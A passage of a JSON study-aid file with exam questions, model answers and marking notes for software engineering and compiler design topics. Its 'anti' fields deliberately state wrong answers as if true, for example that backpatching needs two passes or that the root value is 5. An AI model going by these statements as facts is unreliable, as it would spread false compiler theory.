2081","marks":5,"rep":0},{"id":"se-45","q":"What do you mean by legacy system? Explain its importance.","y":"SE Question Bank 2080","marks":5,"rep":0},{"id":"se-58","q":"Explain maintenance process in detail.","y":"SE Model Question I","marks":5,"rep":0}],"reps":[]},{"n":3,"name":"Agile Software Development","rank":9,"q":5,"m":30,"share":5,"cum":96,"hook":"A shop that fills its storeroom once a year is guessing; the one that restocks every week is reading its customers.","idea":"Agile keeps the work in short fixed windows that each end in something usable, and keeps the backlog ordered and open to change between windows. It fixes time and lets scope emerge, while a fixed-price contract fixes scope and price, so the two mechanisms contradict each other. Sprints re-rank the backlog and measure progress by working software, which leaves nothing stable to sign off and no up-front safety case; regulation needs requirements fixed, traceable and verified, so such projects keep plan-driven elements, and agile fails to scale without architecture and coordination.","one":"Agile replaces one forecast made in advance with a forecast rewritten every two weeks from evidence.","gate":{"q":"Why does agile delivery break down on a fixed-price contract for a safety-critical system?","a":"Agile fixes time and lets scope emerge, while the contract fixes scope and price, so the two mechanisms contradict each other. Sprints re-rank the backlog and measure progress by working software, which leaves nothing stable to sign off and no up-front safety case. Regulation needs requirements fixed, traceable and verified, so such projects keep plan-driven elements and agile fails to scale without architecture and coordination."},"top":{"id":"se-42","q":"Differentiate plan driven and agile development.","y":"SE Question Bank 2080","marks":5,"rep":2,"ans":"Plan-driven development separates specification, design, build and test, and measures progress against a plan made in advance. Agile development delivers in short increments and lets requirements emerge.\n• Requirements: plan-driven fixes them early; agile expects and welcomes change.\n• Documentation: plan-driven treats documents as deliverables; agile keeps them minimal, working software being primary.\n• Design: big design up front versus emergent design with continuous refactoring.\n• Change: formal change requests and a change control board versus a prioritised backlog.\n• Team: large distributed teams and fixed-price contracts versus small co-located teams with an on-site customer.\nPlan-driven fits safety-critical, regulated systems needing traceability; agile fits web products where the market shifts. Example: flight-control software is plan-driven; a food-delivery app is agile.","skel":["Requirements fixed in advance vs evolve continuously","Heavy documentation vs working software primary","Formal change control vs embrace change","Big design up front vs emergent design and refactoring","Fit: safety-critical and contracts vs fast product work"],"logic":"Tests the plan-driven versus agile distinction on the axes that matter — requirement stability, documentation, change control, team size.","how":"Four paired contrasts in the order requirements, documentation, change, team. Add one line on which project each suits.","gateA":"Plan-driven development separates specification, design, build and test, and measures progress against a plan made in advance. Agile development delivers in short increments and lets requirements emerge.\n• Requirements: plan-driven fixes them early; agile expects and welcomes change.\n• Documentation: plan-driven treats documents as deliverables; agile keeps them minimal, working software being primary.\n• Design: big design up front versus emergent design with continuous refactoring.\n• Change: formal change requests and a change control board versus a prioritised backlog.\n• Team: large distributed teams and fixed-price contracts versus small co-located teams with an on-site customer.\nPlan-driven fits safety-critical, regulated systems needing traceability; agile fits web products where the market shifts. Example: flight-control software is plan-driven; a food-delivery app is agile. Requirements fixed in advance vs evolve continuously Heavy documentation vs working software primary Formal change control vs embrace change Big design up front vs emergent design and refactoring Fit: safety-critical and contracts vs fast product work","anti":""},"keys":["Agile Manifesto","Sprint","Product backlog","Scrum roles","Velocity","XP practices"],"ask":[{"id":"se-42","q":"Differentiate plan driven and agile development.","y":"SE Question Bank 2080","marks":5,"rep":2},{"id":"se-86","q":"Explain the agile software development. Compare between agile software development with prototyping software development.","y":"SE Question Bank 2077","marks":10,"rep":0},{"id":"se-35","q":"What are the principles of agile development? Explain agile development techniques.","y":"SE Question Bank 2081","marks":5,"rep":0}],"reps":[{"id":"r20","q":"Differentiate between plan driven and agile development. Explain agile project management.","count":2,"marks":5}]},{"n":1,"name":"Introduction","rank":10,"q":5,"m":25,"share":4,"cum":100,"hook":"One mason builds a house from memory; forty flats need drawings that outlive him.","idea":"Computer science asks what can be computed and how efficiently; software engineering asks how to deliver it to a cost, schedule and quality target with a team that will not stay forever. At scale, heterogeneity, legacy systems and constant business change defeat amateur programming, so process, documentation and explicit trade-offs appear — the written decisions that keep a large system buildable and changeable by people who never met its author. Because most lifetime cost is post-delivery, the discipline designs for change.","one":"Software engineering is the paperwork that keeps a big system changeable after the people who built it have left.","gate":{"q":"Why does software engineering exist as a discipline separate from computer science?","a":"Computer science asks what can be computed and how efficiently; software engineering asks how to deliver it to a cost, schedule and quality target with a team that will not stay forever. At scale, heterogeneity, legacy systems and constant business change defeat amateur programming, so process, documentation and explicit trade-offs appear. Because most lifetime cost is post-delivery, the discipline designs for change."},"top":{"id":"se-4","q":"Describe software engineering ethics thal needs to be followed.Why is it important ?","y":"SE Question Bank 2082","marks":5,"rep":0,"ans":"Software engineering ethics is the set of professional standards of conduct (ACM/IEEE code) that guide engineers beyond legal minimums.\n• Public interest — protect safety, privacy and health; disclose risks.\n• Client and employer — act in their interest, keep confidentiality, take no bribes.\n• Product — meet the highest standards, test adequately, make no false claims.\n• Judgement — stay competent, be objective, accept criticism.\n• Management — promote ethical culture, fair treatment, realistic schedules.\n• Profession and colleagues — advance the discipline, credit others' work.\n• Self — keep learning, never misrepresent skills.\nImportance: software now controls money, medical records and public services, so a silent defect harms real people; ethics protects the public, preserves trust in the profession and limits legal liability. Example: refusing to ship a payroll system with a known authentication flaw, even under deadline pressure.","skel":["Define ethics: professional conduct beyond law","Bullets by duty: public, client, product, judgement","Bullets: management, profession, colleagues, self","Importance: safety, trust, liability","Example: refusing to ship a known security hole"],"logic":"Checks that you can name the ACM/IEEE-style duties by group and then justify them socially — most answers list confidentiality only and lose the 'why important' marks.","how":"Use the eight code headings as your bullets, then two sentences of importance with one concrete risk example.","gateA":"Software engineering ethics is the set of professional standards of conduct (ACM/IEEE code) that guide engineers beyond legal minimums.\n• Public interest — protect safety, privacy and health; disclose risks.\n• Client and employer — act in their interest, keep confidentiality, take no bribes.\n• Product — meet the highest standards, test adequately, make no false claims.\n• Judgement — stay competent, be objective, accept criticism.\n• Management — promote ethical culture, fair treatment, realistic schedules.\n• Profession and colleagues — advance the discipline, credit others' work.\n• Self — keep learning, never misrepresent skills.\nImportance: software now controls money, medical records and public services, so a silent defect harms real people; ethics protects the public, preserves trust in the profession and limits legal liability. Example: refusing to ship a payroll system with a known authentication flaw, even under deadline pressure. Define ethics: professional conduct beyond law Bullets by duty: public, client, product, judgement Bullets: management, profession, colleagues, self Importance: safety, trust, liability Example: refusing to ship a known security hole","anti":""},"keys":["Software","Four core quality attributes","Software engineering","SE vs computer science","SE vs system engineering","Maintenance share"],"ask":[{"id":"se-4","q":"Describe software engineering ethics thal needs to be followed.Why is it important ?","y":"SE Question Bank 2082","marks":5,"rep":0},{"id":"se-57","q":"Differentiate between software engineering and computer science.","y":"SE Model Question I","marks":5,"rep":0},{"id":"se-77","q":"Differentiate between software engineering and system engineering.","y":"SE Question Bank 2079","marks":5,"rep":0},{"id":"se-88","q":"What are the good characteristics of software? Explain.","y":"SE Question Bank 2077","marks":5,"rep":0}],"reps":[]}]},"cdc":{"name":"Compiler Design and Construction","code":"CSC376","exam":"2026-12-13","totalQ":92,"totalM":695,"units":[{"n":2,"name":"Lexical Analysis and Syntax Analysis","rank":1,"q":35,"m":275,"share":40,"cum":40,"hook":"At the airport one officer only stamps slips, and the officer behind her decides whether the whole trip is legal.","idea":"Token shapes are regular, so a finite automaton recognises them with bounded memory. Sentence structure is context-free, so the parser needs a stack to match nested constructs. Splitting the two lets the scanner be generated from regular expressions and the parser from a grammar, and keeps each error message at the right level.","one":"The scanner classifies with bounded memory; the parser proves the sequence legal with a stack, because grammar nests.","gate":{"q":"Why can a finite automaton tokenise a program but not decide whether its brackets balance?","a":"A finite automaton has only a fixed number of states, so it remembers a bounded amount of context and cannot count unbounded nesting. Tokens are regular: each is matched by a pattern built from concatenation, union and star, which Thompson's construction turns into an NFA and subset construction into a DFA. Brackets and ifs nest to any depth, so matching them needs a stack, which the parser keeps."},"top":{"id":"cdc-37","q":"Give an example of reduce-reduce conflict. Construct the SLR parsing table for the following grammar.","y":"CDC Question Bank 2081","marks":10,"rep":4,"ans":"Reduce-reduce conflict: one state contains two completed items with different left sides and a common lookahead.\nExample: S -> aAd | bBd | aBe | bAe, A -> c, B -> c. After reading a c, the state is {A -> c., B -> c.}. FOLLOW(A) = FOLLOW(B) = {d, e}, so SLR puts reduce A -> c and reduce B -> c in both the d and e columns — a reduce-reduce conflict. LR(1) separates them because the lookaheads differ by context ({A -> c., d} and {B -> c., e} after a), and LALR merges those states and conflicts again.\nSLR table for E -> (L) | a, L -> L, E | E. Augment to S' -> E.\nFOLLOW(E) = { ), comma, $ }, FOLLOW(L) = { ), comma }.\nI0: S'->.E, E->.(L), E->.a  goto E 1, ( 2, a 3\nI1: S'->E.\nI2: E->(.L), L->.L,E, L->.E, E->.(L), E->.a  goto L 4, E 5, ( 2, a 3\nI3: E->a.\nI4: E->(L.), L->L.,E  goto ) 6, comma 7\nI5: L->E.\nI6: E->(L).\nI7: L->L,.E, E->.(L), E->.a  goto E 8, ( 2, a 3\nI8: L->L,E.\nACTION and GOTO:\n0: ( s2, a s3, E 1\n1: $ accept\n2: ( s2, a s3, E 5, L 4\n3: reduce E->a on ), comma, $\n4: ) s6, comma s7\n5: reduce L->E on ), comma\n6: reduce E->(L) on ), comma, $\n7: ( s2, a s3, E 8\n8: reduce L->L,E on ), comma\nNo cell has two entries, so the grammar is SLR(1).","skel":["RR example with A -> c and B -> c","Show both reduces on d and e","Eight item sets I0-I8","FOLLOW(E) and FOLLOW(L)","Fill ACTION and GOTO, accept on $"],"logic":"Tests whether you can produce a conflict example and then build an SLR table where reductions depend on FOLLOW. Typical errors are putting r on the wrong lookahead or forgetting accept only on $.","how":"Give the four-production RR example in three lines, then the nine SLR states. Every reduce entry must come from FOLLOW of the left side.","gateA":"Reduce-reduce conflict: one state contains two completed items with different left sides and a common lookahead.\nExample: S -> aAd | bBd | aBe | bAe, A -> c, B -> c. After reading a c, the state is {A -> c., B -> c.}. FOLLOW(A) = FOLLOW(B) = {d, e}, so SLR puts reduce A -> c and reduce B -> c in both the d and e columns — a reduce-reduce conflict. LR(1) separates them because the lookaheads differ by context ({A -> c., d} and {B -> c., e} after a), and LALR merges those states and conflicts again.\nSLR table for E -> (L) | a, L -> L, E | E. Augment to S' -> E.\nFOLLOW(E) = { ), comma, $ }, FOLLOW(L) = { ), comma }.\nI0: S'->.E, E->.(L), E->.a  goto E 1, ( 2, a 3\nI1: S'->E.\nI2: E->(.L), L->.L,E, L->.E, E->.(L), E->.a  goto L 4, E 5, ( 2, a 3\nI3: E->a.\nI4: E->(L.), L->L.,E  goto ) 6, comma 7\nI5: L->E.\nI6: E->(L).\nI7: L->L,.E, E->.(L), E->.a  goto E 8, ( 2, a 3\nI8: L->L,E.\nACTION and GOTO:\n0: ( s2, a s3, E 1\n1: $ accept\n2: ( s2, a s3, E 5, L 4\n3: reduce E->a on ), comma, $\n4: ) s6, comma s7\n5: reduce L->E on ), comma\n6: reduce E->(L) on ), comma, $\n7: ( s2, a s3, E 8\n8: reduce L->L,E on ), comma\nNo cell has two entries, so the grammar is SLR(1). RR example with A -> c and B -> c Show both reduces on d and e Eight item sets I0-I8 FOLLOW(E) and FOLLOW(L) Fill ACTION and GOTO, accept on $","anti":"A reduce-reduce conflict means one state has two completed items with the same left side and different lookaheads, so SLR places only one reduce in the table and the grammar is always SLR(1); the FOLLOW sets are irrelevant to the conflict."},"keys":["Token, lexeme, pattern","Thompson's construction","Subset construction","DFA minimisation","FIRST(α)","FOLLOW(A)"],"ask":[{"id":"cdc-37","q":"Give an example of reduce-reduce conflict. Construct the SLR parsing table for the following grammar.","y":"CDC Question Bank 2081","marks":10,"rep":4},{"id":"cdc-51","q":"Differentiate between recursive descent and non-recursive predictive parsing method. Find first and follow of all the non-terminals in the following grammar.","y":"CDC Question Bank 2075","marks":10,"rep":2},{"id":"cdc-1","q":"Define important state. Why do we need augmented regular expression? Convert the regular expression “(a + b)*a(a + b)” to DFA.","y":"CDC Question Bank 2082","marks":10,"rep":0},{"id":"cdc-13","q":"What is the difference between LR(0), SLR(1), and LR(1) parsing? Explain with examples when each would fail or succeed.","y":"CDC Model Set II","marks":10,"rep":0}],"reps":[{"id":"r0","q":"Give an example of reduce-reduce conflict. Construct the SLR parsing table for the following grammar.","count":4,"marks":10},{"id":"r6","q":"Differentiate between recursive descent and non-recursive predictive parsing method. Find first and follow of all the non-terminals in the following grammar.","count":2,"marks":10},{"id":"r17","q":"Compute the FIRST and FOLLOW of the non-terminals in the following grammar:S → (L) ∣ 1L → LS ∣∗S","count":2,"marks":5}]},{"n":7,"name":"Intermediate Code Generation","rank":2,"q":10,"m":75,"share":11,"cum":50,"hook":"The order says steam the momos; no single cook can execute a sentence like that, so it becomes numbered steps.","idea":"Lower every expression into instructions with at most one operator, each writing a named temporary. Nothing in that form mentions a processor, so one optimiser and one set of analyses serve every target, and identical subtrees can share a single computed value. Quadruples name the result explicitly, triples use the instruction number, and indirect triples add a pointer list so that steps can be reordered.","one":"Flatten the expression into one-operator steps with named bowls, so any back end can cook the same recipe.","gate":{"q":"Why lower the annotated tree to three-address code instead of generating machine instructions directly from it?","a":"A tree keeps grammar structure that no optimiser or target needs, and mapping it straight to one machine welds the language to that processor. Three-address code allows at most one operator per instruction with named temporaries, so a repeated subexpression can be computed once, moved or deleted, and the same form feeds every back end. Quadruples, triples and indirect triples are merely encodings of that flat list."},"top":{"id":"cdc-26","q":"What is backpatching? Why is it used in code generation? Generate three-address code with backpatching for the following code:","y":"CDC Model Set I","marks":10,"rep":0,"ans":"Backpatching: generating code in a single pass while jump targets are still unknown. A jump is emitted with an empty target field and its instruction number is collected in a list (truelist or falselist); when the target label becomes known, the list is patched. Functions: makelist(i) creates a list containing i; merge(p1,p2) concatenates two lists; backpatch(p,L) writes label L into the target field of every instruction in p. Used for boolean expressions, if and while.\nwhile (a<b) { if (c<d) x=y+z; else x=y-z; }\n100: if a<b goto 102\n101: goto 110\n102: if c<d goto 104\n103: goto 107\n104: t1 = y + z\n105: x = t1\n106: goto 100\n107: t2 = y - z\n108: x = t2\n109: goto 100\n110: next statement\nBackpatching: after a<b, truelist = {100} and falselist = {101}; backpatch({100},102) when the body begins. After c<d, backpatch({103},107) sends the false case to the else part, and the else part's exit is merged with the then part's to fall to 106/109. When the loop ends, backpatch({101},110). Quadruples: (j<,a,b,102), (j,-,-,110), (j<,c,d,104), (j,-,-,107), (+,y,z,t1), (=,t1,-,x), (j,-,-,100), (-,y,z,t2), (=,t2,-,x), (j,-,-,100).","skel":["Jump targets unknown in one pass","makelist, merge, backpatch","Label the while and inner if-else","Body gets 102, else gets 107, exit 110","Show the ten quadruples"],"logic":"Tests one-pass code generation for forward jumps: emit with holes, keep lists, fill later. Students write three-address code with labels but cannot show a list being patched, which is the actual ask.","how":"Define the three functions, then label the while/if-else and finish with one patched quadruple list.","gateA":"Backpatching: generating code in a single pass while jump targets are still unknown. A jump is emitted with an empty target field and its instruction number is collected in a list (truelist or falselist); when the target label becomes known, the list is patched. Functions: makelist(i) creates a list containing i; merge(p1,p2) concatenates two lists; backpatch(p,L) writes label L into the target field of every instruction in p. Used for boolean expressions, if and while.\nwhile (a<b) { if (c<d) x=y+z; else x=y-z; }\n100: if a<b goto 102\n101: goto 110\n102: if c<d goto 104\n103: goto 107\n104: t1 = y + z\n105: x = t1\n106: goto 100\n107: t2 = y - z\n108: x = t2\n109: goto 100\n110: next statement\nBackpatching: after a<b, truelist = {100} and falselist = {101}; backpatch({100},102) when the body begins. After c<d, backpatch({103},107) sends the false case to the else part, and the else part's exit is merged with the then part's to fall to 106/109. When the loop ends, backpatch({101},110). Quadruples: (j<,a,b,102), (j,-,-,110), (j<,c,d,104), (j,-,-,107), (+,y,z,t1), (=,t1,-,x), (j,-,-,100), (-,y,z,t2), (=,t2,-,x), (j,-,-,100). Jump targets unknown in one pass makelist, merge, backpatch Label the while and inner if-else Body gets 102, else gets 107, exit 110 Show the ten quadruples","anti":"Backpatching generates code in two passes after every label is known, so jumps are emitted with a filled target and no list is needed; makelist and merge are used to delete labels, which is why backpatching is slower than a single pass."},"keys":["Intermediate representation","Three-address code","Quadruple","Triple","Indirect triple","DAG"],"ask":[{"id":"cdc-26","q":"What is backpatching? Why is it used in code generation? Generate three-address code with backpatching for the following code:","y":"CDC Model Set I","marks":10,"rep":0},{"id":"cdc-38","q":"What are the significances of intermediate code? Differentiate between DAG and Syntax tree. Represent the instruction A = B + C − D * E + G using quadruple and triple.","y":"CDC Question Bank 2081","marks":10,"rep":0},{"id":"cdc-55","q":"Define three address codes. write three address codes for","y":"CDC Question Bank 2075","marks":10,"rep":0},{"id":"cdc-77","q":"Explain with example about different methods of intermediate code representation.","y":"CDC Question Bank 2076","marks":10,"rep":0}],"reps":[]},{"n":3,"name":"Syntax-Directed Translation","rank":3,"q":9,"m":70,"share":10,"cum":60,"hook":"The drawing proves the house is legal, but nothing in it yet says how much brick to order.","idea":"A syntax-directed definition attaches a semantic rule to every production. Attributes are synthesized when their value comes from children and inherited when it comes from the parent or an earlier sibling. If every attribute is synthesized, one postorder walk suffices; if inherited values depend only on the left, one left-to-right pass suffices, and that restricted form is what top-down translators can run.","one":"An SDD writes the meaning on the parse tree; the direction the numbers travel decides the evaluation order.","gate":{"q":"What decides whether a syntax-directed definition can be evaluated in a single pass over the parse tree?","a":"The direction attributes travel decides the order. A synthesized attribute is computed from the children and rises, so an S-attributed definition needs one post-order traversal, children before parents. An inherited attribute comes from the parent or a left sibling, and when it never depends on a right sibling the definition is L-attributed, so one left-to-right depth-first pass suffices for a predictive parser."},"top":{"id":"cdc-53","q":"Define Syntax directed definition. Construct annotated parse tree for the input expression (5*3+2)*5 according to the following","y":"CDC Question Bank 2075","marks":10,"rep":2,"ans":"A syntax-directed definition attaches semantic rules to each production; an annotated parse tree is the parse tree with every attribute value written beside its node.\nSDD:\nE -> E1 + T   { E.val = E1.val + T.val }\nE -> T        { E.val = T.val }\nT -> T1 * F   { T.val = T1.val * F.val }\nT -> F        { T.val = F.val }\nF -> ( E )    { F.val = E.val }\nF -> digit    { F.val = digit.lexval }\nInput (5 * 3 + 2) * 5. Tree and values, bottom-up:\nLeaves: F(5) val 5, F(3) val 3, F(2) val 2, F(5) val 5.\nInner 5 * 3: T -> T1 * F with T1 = F(5) = 5 and F = 3, so T.val = 15; then T -> F gives the left operand of + the value 15.\nInner sum: E -> E1 + T with E1 = T(5*3) = 15 and T = F(2) = 2, so E.val = 15 + 2 = 17.\nBrackets: F -> ( E ) copies the value, so F.val = 17.\nOuter product: T -> T1 * F with T1 = F(17) = 17 and F = 5, so T.val = 17 * 5 = 85.\nRoot value 85, which is the value of the whole expression. Draw the outer * at the root, the bracketed E as its left child and F(5) as its right child, and write val at the right of every node.","skel":["Write the six-rule SDD","Draw tree for (5*3+2)*5","Leaves: 5, 3, 2, 5","Inner product 15, sum 17","Root 17 * 5 = 85"],"logic":"Tests whether you can evaluate an SDD on a real parse tree: structure top-down, values bottom-up. The parenthesised subtree is where marks are lost, and the root value must be 85.","how":"Draw the whole tree first with leaves 5, 3, 2, 5, then annotate upwards: products 15, then 17, then the outer product. Write val beside every node.","gateA":"A syntax-directed definition attaches semantic rules to each production; an annotated parse tree is the parse tree with every attribute value written beside its node.\nSDD:\nE -> E1 + T   { E.val = E1.val + T.val }\nE -> T        { E.val = T.val }\nT -> T1 * F   { T.val = T1.val * F.val }\nT -> F        { T.val = F.val }\nF -> ( E )    { F.val = E.val }\nF -> digit    { F.val = digit.lexval }\nInput (5 * 3 + 2) * 5. Tree and values, bottom-up:\nLeaves: F(5) val 5, F(3) val 3, F(2) val 2, F(5) val 5.\nInner 5 * 3: T -> T1 * F with T1 = F(5) = 5 and F = 3, so T.val = 15; then T -> F gives the left operand of + the value 15.\nInner sum: E -> E1 + T with E1 = T(5*3) = 15 and T = F(2) = 2, so E.val = 15 + 2 = 17.\nBrackets: F -> ( E ) copies the value, so F.val = 17.\nOuter product: T -> T1 * F with T1 = F(17) = 17 and F = 5, so T.val = 17 * 5 = 85.\nRoot value 85, which is the value of the whole expression. Draw the outer * at the root, the bracketed E as its left child and F(5) as its right child, and write val at the right of every node. Write the six-rule SDD Draw tree for (5*3+2)*5 Leaves: 5, 3, 2, 5 Inner product 15, sum 17 Root 17 * 5 = 85","anti":"A syntax-directed definition attaches no semantic rules to productions; the annotated parse tree stores only the grammar symbols, so (5*3+2)*5 evaluates from the root down and the root value is 5 rather than 85."},"keys":["Syntax-directed definition","Synthesized attribute","Inherited attribute","S-attributed definition","L-attributed definition","Annotated parse tree"],"ask":[{"id":"cdc-53","q":"Define Syntax directed definition. Construct annotated parse tree for the input expression (5*3+2)*5 according to the following","y":"CDC Question Bank 2075","marks":10,"rep":2},{"id":"cdc-88","q":"Define attribute grammar with example of inherited and synthesized attributes","y":"CDC Question Bank 2078","marks":10,"rep":2},{"id":"cdc-15","q":"What is L-attributed definition? Differentiate between S-attributed and L-attributed definitions with examples.","y":"CDC Model Set II","marks":10,"rep":0},{"id":"cdc-66","q":"What is annotated parse tree? Define S-attributed grammar with an example.","y":"CDC Question Bank 2080","marks":5,"rep":0}],"reps":[{"id":"r4","q":"Define inherited and synthesized attribute. Compute the FOLLOW set for the following grammar:","count":2,"marks":10},{"id":"r5","q":"Define Syntax directed definition. Construct annotated parse tree for the input expression (5*3+2)*5 according to the following","count":2,"marks":10}]},{"n":1,"name":"Introduction to Compiler","rank":4,"q":8,"m":60,"share":9,"cum":69,"hook":"A letter written in Nepali must reach a reader who knows only English, and no single clerk can do the whole job.","idea":"A compiler is a pipeline of small specialists, each taking one representation and producing a simpler or more machine-like one. No single translator can be built, tested and retargeted, but one phase's output is the documented input of the next, so each can be proved and marked alone. Splitting at a machine-independent form lets n languages and m machines cost n plus m pieces instead of n times m translators, and each error is reported by the phase that can name it.","one":"A compiler is a chain of single-job clerks joined by a neutral draft that belongs to no language and no machine.","gate":{"q":"Why is a compiler built from several phases rather than one translator that maps source straight to machine code?","a":"Because no single translator can be built, tested and retargeted: one phase's output is the documented input of the next, so each can be proved and marked alone. Splitting at a machine-independent form lets n languages and m machines cost n plus m pieces instead of n times m translators, and each error is reported by the phase that can name it."},"top":{"id":"cdc-49","q":"Difference between compiler and interpreter. “Symbol table is necessary component of compiler”. Justify this statement with examples.","y":"CDC Question Bank 2075","marks":10,"rep":0,"ans":"Compiler vs interpreter:\n• Translation: a compiler translates the whole program into object code before running it; an interpreter executes the source statement by statement.\n• Output: the compiler produces an object or executable file; the interpreter produces only results, no file.\n• Speed: compiled code runs faster because decoding happens once; interpretation is slower.\n• Errors: the compiler scans everything and reports all errors together; the interpreter stops at the first error.\n• Memory: the compiler needs space for the object code and is itself larger; the interpreter needs less.\n• Examples: C, C++, Go are compiled; Python, JavaScript, Ruby are interpreted. Java uses both (javac then the JVM).\nSymbol table is a necessary component — every phase uses it:\n• Lexical analysis inserts each identifier as it is recognised, with its lexeme.\n• Syntax analysis checks redeclaration and records structure (array bounds, parameter lists) as the declaration is parsed.\n• Semantic analysis needs the declared type of every id to check int + real, to resolve scope, and to check the number and types of arguments; this is its main input.\n• Intermediate code and code generation need the storage class and the offset of each variable to emit the right address, and register allocation needs to know which names are live.\nWithout the table, two variables with the same name in different scopes could not be distinguished and undeclared identifiers could not be reported. It is shared by all phases, so it is not optional.","skel":["Six-row compiler vs interpreter table","Symbol table definition and operations","Lexical inserts, parser checks redeclaration","Semantic needs type and scope","Codegen needs storage class and offset"],"logic":"Tests translation versus execution, then whether you can justify the symbol table phase by phase. A justification that says only it stores names ignores the code-generation and scoping reasons.","how":"Six-row comparison table, then four bullets, one per phase that touches the table. The per-phase argument is the justification.","gateA":"Compiler vs interpreter:\n• Translation: a compiler translates the whole program into object code before running it; an interpreter executes the source statement by statement.\n• Output: the compiler produces an object or executable file; the interpreter produces only results, no file.\n• Speed: compiled code runs faster because decoding happens once; interpretation is slower.\n• Errors: the compiler scans everything and reports all errors together; the interpreter stops at the first error.\n• Memory: the compiler needs space for the object code and is itself larger; the interpreter needs less.\n• Examples: C, C++, Go are compiled; Python, JavaScript, Ruby are interpreted. Java uses both (javac then the JVM).\nSymbol table is a necessary component — every phase uses it:\n• Lexical analysis inserts each identifier as it is recognised, with its lexeme.\n• Syntax analysis checks redeclaration and records structure (array bounds, parameter lists) as the declaration is parsed.\n• Semantic analysis needs the declared type of every id to check int + real, to resolve scope, and to check the number and types of arguments; this is its main input.\n• Intermediate code and code generation need the storage class and the offset of each variable to emit the right address, and register allocation needs to know which names are live.\nWithout the table, two variables with the same name in different scopes could not be distinguished and undeclared identifiers could not be reported. It is shared by all phases, so it is not optional. Six-row compiler vs interpreter table Symbol table definition and operations Lexical inserts, parser checks redeclaration Semantic needs type and scope Codegen needs storage class and offset","anti":"A compiler executes the source statement by statement and produces no object file, while an interpreter translates the whole program before running it and produces an executable; the symbol table is optional because names can be resolved at run time."},"keys":["Compiler","Interpreter","Analysis (front end)","Synthesis (back end)","Token","Symbol table"],"ask":[{"id":"cdc-49","q":"Difference between compiler and interpreter. “Symbol table is necessary component of compiler”. Justify this statement with examples.","y":"CDC Question Bank 2075","marks":10,"rep":0},{"id":"cdc-71","q":"Explain briefly about different phases involved in compiler, with a block diagram","y":"CDC Question Bank 2076","marks":10,"rep":0},{"id":"cdc-80","q":"Discuss the importance of error handler in compiler. How is it manipulated in the different phases of compilation?","y":"CDC Question Bank 2076","marks":10,"rep":0},{"id":"cdc-16","q":"Draw the detailed block diagram of a compiler showing all phases with inputs and outputs of each phase. Explain how symbol table and error handler interact with different phases of compilation.","y":"CDC Model Set II","marks":5,"rep":0}],"reps":[]},{"n":8,"name":"Code Generation","rank":5,"q":8,"m":60,"share":9,"cum":78,"hook":"The recipe says mix, but the kitchen must still decide which pan is already hot on the stove.","idea":"Code generation chooses, for each intermediate instruction, real instructions and a home for every value. Basic blocks and their DAG show what is reused and what is dead inside a straight run; register allocation is an assignment of a small set of registers to many live values, solved by graph colouring or by heuristics with next-use information, spilling to memory when the pressure is too high. The first instruction, every jump target and every instruction immediately after a jump is a leader, so a jump may enter only at a leader and no branch lands in the middle of the block.","one":"Code generation is choosing real utensils: which values stay hot in registers, which get shelved, and which work is repeated.","gate":{"q":"How is a program split into basic blocks, and why must no branch enter a block except at its first instruction?","a":"The first instruction is a leader, every jump target is a leader, and every instruction immediately after a jump is a leader, so a block runs from a leader to the instruction before the next. A jump may enter only at a leader, so no branch lands in the middle, which keeps the block straight-line and lets its DAG expose repeated and dead computations before registers are assigned."},"top":{"id":"cdc-58","q":"Discuss about the different factors affecting target code generation.","y":"CDC Question Bank 2075","marks":10,"rep":2,"ans":"Factors affecting target code generation:\n• Target machine instruction set: which operations exist. With no multiply instruction the generator must emit shifts and adds; register-to-register and register-to-memory machines need different sequences.\n• Number and types of registers: more registers mean fewer loads, stores and spills, and floating-point registers change how reals are moved.\n• Addressing modes: indexed, indirect and auto-increment modes let x = y[i] become one instruction instead of separate address arithmetic.\n• Instruction cost and timing: the generator must pick the cheapest correct sequence, not the most obvious one, and must respect delayed branches and pipeline stalls.\n• IR form and quality: three-address code organised into basic blocks with good temporaries produces better code than a raw tree with redundant temporaries.\n• Register allocation and assignment policy: graph colouring, spilling, and which value is kept in a register across a block boundary.\n• Instruction selection and ordering: tree-pattern matching over the DAG, then scheduling to hide memory latency.\n• Memory hierarchy: cache locality — loop order and data layout decide how many cache misses the code causes.\n• Peephole optimisation after generation: removes redundant loads and stores, jump-to-jump and constant computations.\n• Run-time environment and ABI: calling conventions, stack alignment, position-independent code and debugging information constrain the choices.\nThe factors conflict, and optimal instruction selection is NP-hard in general, so practical generators use heuristic and DAG-based selection with a cost model.","skel":["Target ISA and instruction formats","Registers available and allocation policy","Addressing modes save instructions","IR form and basic-block structure","Memory hierarchy, scheduling, peephole"],"logic":"Tests code-generator design awareness rather than TAC generation: can you name the machine, IR and policy factors that change the emitted instructions? Listing only registers is not enough.","how":"Eight named factors with one line each on how the generated code changes. Add one addressing-mode example (x = y[i] in a single instruction).","gateA":"Factors affecting target code generation:\n• Target machine instruction set: which operations exist. With no multiply instruction the generator must emit shifts and adds; register-to-register and register-to-memory machines need different sequences.\n• Number and types of registers: more registers mean fewer loads, stores and spills, and floating-point registers change how reals are moved.\n• Addressing modes: indexed, indirect and auto-increment modes let x = y[i] become one instruction instead of separate address arithmetic.\n• Instruction cost and timing: the generator must pick the cheapest correct sequence, not the most obvious one, and must respect delayed branches and pipeline stalls.\n• IR form and quality: three-address code organised into basic blocks with good temporaries produces better code than a raw tree with redundant temporaries.\n• Register allocation and assignment policy: graph colouring, spilling, and which value is kept in a register across a block boundary.\n• Instruction selection and ordering: tree-pattern matching over the DAG, then scheduling to hide memory latency.\n• Memory hierarchy: cache locality — loop order and data layout decide how many cache misses the code causes.\n• Peephole optimisation after generation: removes redundant loads and stores, jump-to-jump and constant computations.\n• Run-time environment and ABI: calling conventions, stack alignment, position-independent code and debugging information constrain the choices.\nThe factors conflict, and optimal instruction selection is NP-hard in general, so practical generators use heuristic and DAG-based selection with a cost model. Target ISA and instruction formats Registers available and allocation policy Addressing modes save instructions IR form and basic-block structure Memory hierarchy, scheduling, peephole","anti":"Target code generation is independent of the instruction set, register count and addressing modes, because the IR already fixes the machine code; more registers mean more loads and a peephole pass makes scheduling unnecessary."},"keys":["Basic block","Leader","Flow graph","DAG of a block","Register allocation","Spilling"],"ask":[{"id":"cdc-58","q":"Discuss about the different factors affecting target code generation.","y":"CDC Question Bank 2075","marks":10,"rep":2},{"id":"cdc-2","q":"How do you create a control flow graph from a basic block? Explain the need and criteria for code optimization.","y":"CDC Question Bank 2082","marks":10,"rep":0},{"id":"cdc-23","q":"Construct the flow graph for the following code and identify all basic blocks:","y":"CDC Model Set II","marks":5,"rep":0},{"id":"cdc-35","q":"What is register allocation? Explain register allocation using graph coloring algorithm. Given the following live ranges, perform register allocation with 3 registers available:","y":"CDC 